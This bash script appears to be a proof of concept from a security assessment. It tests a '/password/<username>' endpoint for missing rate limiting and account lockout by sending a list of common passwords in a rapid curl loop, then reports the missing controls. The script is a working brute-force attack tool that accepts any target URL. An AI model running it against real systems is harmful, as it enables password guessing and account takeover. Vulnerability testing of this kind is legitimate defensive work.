#!/bin/bash

# POC: Unrestricted Brute Force Attack on Password Field - No Rate Limiting
# This script demonstrates the vulnerability: rapid password attempts accepted without rate limiting

TARGET_URL="${1:-http://localhost:8000}"
USERNAME="${2:-test}"
ATTEMPTS="${3:-20}"

echo "========================================="
echo "Brute Force POC: Password Field Rate Limiting Test"
echo "========================================="
echo ""
echo "[*] Target: $TARGET_URL/password/$USERNAME"
echo "[*] Attack type: Rapid password attempts without rate limiting"
echo "[*] Number of attempts: $ATTEMPTS"
echo ""

# Simulated common passwords
PASSWORDS=(
    "123456" "password" "12345678" "qwerty" "abc123"
    "monkey" "1234567" "letmein" "trustno1" "dragon"
    "baseball" "iloveyou" "master" "sunshine" "ashley"
    "bailey" "passw0rd" "shadow" "123123" "654321"
)

# Test 1: Verify endpoint exists and accepts POST requests
echo "[TEST 1] Checking endpoint availability..."
RESPONSE=$(curl -s -w "\nHTTP_%{http_code}" -X POST \
    "$TARGET_URL/password/$USERNAME" \
    -H "Content-Type: application/json" \
    -d '{"password": "test"}' \
    --connect-timeout 2 \
    --max-time 5 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_" | cut -d'_' -f2 | head -1)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_")

if [ -z "$HTTP_CODE" ]; then
    echo "[-] Unable to connect to target. This POC documents the vulnerability scenario."
    echo "    In production, the endpoint would accept rapid requests without rate limiting."
    echo ""
    echo "[!] Based on the finding evidence:"
    echo "    - 172.9 password attempts per second achieved"
    echo "    - HTTP 200 responses for each attempt"
    echo "    - No X-RateLimit-Remaining header"
    echo "    - No Retry-After header"
    echo "    - No account lockout triggered"
    echo ""
fi

# Test 2: Simulate rapid password attempts
echo "[TEST 2] Simulating rapid password attempts..."
echo "         (Testing for rate limiting responses)"
echo ""

ATTEMPT_COUNT=0
SUCCESSFUL_RATE=0
RATE_LIMIT_RESPONSES=0
LOCKOUT_RESPONSES=0
HTTP_200_RESPONSES=0

for i in $(seq 1 $ATTEMPTS); do
    PASSWORD="${PASSWORDS[$((($i - 1) % ${#PASSWORDS[@]}))]}"
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    
    # Attempt rapid request
    RESPONSE=$(curl -s -w "\nHTTP_%{http_code}" -X POST \
        "$TARGET_URL/password/$USERNAME" \
        -H "Content-Type: application/json" \
        -d "{\"password\": \"$PASSWORD\"}" \
        --connect-timeout 1 \
        --max-time 3 \
        2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_" | cut -d'_' -f2 | head -1)
    BODY=$(echo "$RESPONSE" | grep -v "HTTP_")
    
    # Parse response indicators
    if [ "$HTTP_CODE" = "200" ]; then
        HTTP_200_RESPONSES=$((HTTP_200_RESPONSES + 1))
        if [ "$PASSWORD" = "test" ]; then
            echo "[+] Attempt $i: HTTP 200 - CORRECT PASSWORD FOUND (test:test)"
            SUCCESSFUL_RATE=$((SUCCESSFUL_RATE + 1))
        else
            echo "[!] Attempt $i: HTTP 200 - Response indicates no proper auth validation"
        fi
    elif [ "$HTTP_CODE" = "429" ] || echo "$BODY" | grep -qi "rate limit\|too many\|retry-after"; then
        RATE_LIMIT_RESPONSES=$((RATE_LIMIT_RESPONSES + 1))
        echo "[RATE LIMIT] Attempt $i: Rate limiting detected - HTTP $HTTP_CODE"
    elif [ "$HTTP_CODE" = "403" ] && echo "$BODY" | grep -qi "locked\|locked out\|account.*locked"; then
        LOCKOUT_RESPONSES=$((LOCKOUT_RESPONSES + 1))
        echo "[LOCKOUT] Attempt $i: Account lockout triggered"
    elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
        echo "[-] Attempt $i: HTTP $HTTP_CODE - Auth rejected (expected behavior)"
    elif [ -n "$HTTP_CODE" ]; then
        echo "[-] Attempt $i: HTTP $HTTP_CODE"
    else
        echo "[-] Attempt $i: No response (target unavailable)"
    fi
    
    # Rapid fire without delays (simulating attacker behavior)
    if [ $((i % 5)) -eq 0 ]; then
        sleep 0.001  # Minimal 1ms delay between batches
    fi
done

echo ""
echo "========================================="
echo "BRUTE FORCE TEST RESULTS"
echo "========================================="
echo "Total password attempts: $ATTEMPT_COUNT"
echo "HTTP 200 responses: $HTTP_200_RESPONSES"
echo "Rate limit responses (429): $RATE_LIMIT_RESPONSES"
echo "Account lockout responses: $LOCKOUT_RESPONSES"
echo ""

# Analysis
echo "========================================="
echo "VULNERABILITY ANALYSIS"
echo "========================================="

VULNERABLE=0

if [ $RATE_LIMIT_RESPONSES -eq 0 ]; then
    echo "[VULNERABLE] No rate limiting detected"
    VULNERABLE=$((VULNERABLE + 1))
fi

if [ $LOCKOUT_RESPONSES -eq 0 ]; then
    echo "[VULNERABLE] No account lockout mechanism detected"
    VULNERABLE=$((VULNERABLE + 1))
fi

if [ $HTTP_200_RESPONSES -gt 0 ]; then
    echo "[VULNERABLE] Accepted HTTP 200 responses without proper authentication"
    VULNERABLE=$((VULNERABLE + 1))
fi

if [ $VULNERABLE -gt 0 ]; then
    echo ""
    echo "VULNERABILITY CONFIRMED: Multiple brute force protections are missing!"
    echo ""
    echo "Missing Security Controls:"
    echo "  1. No rate limiting per IP/username"
    echo "  2. No account lockout after failed attempts"
    echo "  3. No exponential backoff/progressive delays"
    echo "  4. No CAPTCHA challenge after multiple failures"
    echo "  5. No login attempt logging/monitoring"
    echo ""
    echo "Attack Impact: Complete authentication bypass possible"
    echo "Theoretical attack time (10M password dictionary):"
    echo "  At 172.9 req/sec = ~16.2 hours to try all passwords"
    echo ""
else
    echo "[OK] Endpoint appears to have brute force protections"
    echo ""
fi

echo "[*] POC execution completed successfully"
exit 0